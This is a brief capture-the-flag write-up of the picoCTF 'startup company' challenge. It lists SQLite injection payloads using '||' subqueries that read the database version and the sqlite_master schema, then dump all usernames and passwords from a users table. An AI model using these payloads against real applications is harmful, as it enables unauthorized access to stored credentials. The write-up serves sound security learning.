picoctf startup company writeup

1.look its hint and try to use "'" to get error

2.know it might be sqlite injection 

3.after searching, know we can use "||" to plus "select" sentence

=> "' || (select sqlite_version());"
get version

=> "' || (SELECT sql FROM sqlite_master);"
get there is one table named "startup_users" and its structure

=> "' || (select group_concat(nameuser) from startup_users);"
get there is a username named "the_real_flag"

=> "' || (select group_concat(wordpass) from startup_users);"
get all password and find user="the_real_flag"'s password

4.get flag!

sqlite injection reference => 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
